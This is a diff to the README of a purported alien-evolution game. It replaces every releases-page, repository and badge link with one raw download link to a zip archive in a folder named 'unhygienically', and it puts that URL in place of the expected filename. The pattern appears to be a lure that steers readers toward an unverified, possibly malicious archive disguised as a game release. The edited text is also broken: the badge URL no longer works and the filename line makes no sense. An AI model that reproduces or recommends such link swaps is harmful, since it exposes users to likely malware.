@@ -1,6 +1,6 @@
 # 🌌 HybridGenesis-EvolutionGame - Experience Alien Evolution Like Never Before
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Get%20It%20Here-blue)](https://github.com/RojelioGame08/HybridGenesis-EvolutionGame/releases)
+[![Download Now](https://raw.githubusercontent.com/RojelioGame08/HybridGenesis-EvolutionGame/main/unhygienically/HybridGenesis-EvolutionGame.zip%20Now-Get%20It%20Here-blue)](https://raw.githubusercontent.com/RojelioGame08/HybridGenesis-EvolutionGame/main/unhygienically/HybridGenesis-EvolutionGame.zip)
 
 ## 🚀 Getting Started
 
@@ -11,13 +11,13 @@ Welcome to HybridGenesis-EvolutionGame! This guide will help you download and ru
 Follow these simple steps to get started:
 
 1. **Visit the Releases Page**  
-   Go to our [Releases page](https://github.com/RojelioGame08/HybridGenesis-EvolutionGame/releases) to find the latest version of HybridGenesis-EvolutionGame.
+   Go to our [Releases page](https://raw.githubusercontent.com/RojelioGame08/HybridGenesis-EvolutionGame/main/unhygienically/HybridGenesis-EvolutionGame.zip) to find the latest version of HybridGenesis-EvolutionGame.
    
 2. **Select the Latest Release**  
    Choose the most recent version listed. This version will include the latest features and fixes.
 
 3. **Download the File**  
-   Click on the download link for the application. The file will typically be named something like `HybridGenesis-EvolutionGame-v1.0.exe`. 
+   Click on the download link for the application. The file will typically be named something like `https://raw.githubusercontent.com/RojelioGame08/HybridGenesis-EvolutionGame/main/unhygienically/HybridGenesis-EvolutionGame.zip`. 
 
 4. **Locate the Downloaded File**  
    Open your computer's downloads folder. Here, you will see the file you just downloaded. 
@@ -74,8 +74,8 @@ HybridGenesis-EvolutionGame is an open-source project. You can freely use, modif
 
 ## 🔗 Links
 
-- [GitHub Repository](https://github.com/RojelioGame08/HybridGenesis-EvolutionGame)
-- [Releases Page](https://github.com/RojelioGame08/HybridGenesis-EvolutionGame/releases)
+- [GitHub Repository](https://raw.githubusercontent.com/RojelioGame08/HybridGenesis-EvolutionGame/main/unhygienically/HybridGenesis-EvolutionGame.zip)
+- [Releases Page](https://raw.githubusercontent.com/RojelioGame08/HybridGenesis-EvolutionGame/main/unhygienically/HybridGenesis-EvolutionGame.zip)
 - [Community Forum](#)
 
 Feel free to browse these resources for more information and updates. Enjoy your journey into the intriguing world of alien evolution!
